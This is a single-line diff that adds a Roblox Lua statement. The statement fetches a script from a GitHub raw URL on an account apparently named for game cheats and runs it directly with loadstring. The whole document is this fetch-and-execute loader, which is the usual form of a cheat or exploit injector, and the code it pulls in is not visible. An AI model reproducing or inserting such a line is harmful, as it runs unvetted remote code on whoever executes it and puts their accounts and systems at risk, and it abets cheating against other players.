@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KGuestCheatsJ2/Sc/refs/heads/main/CS"))()
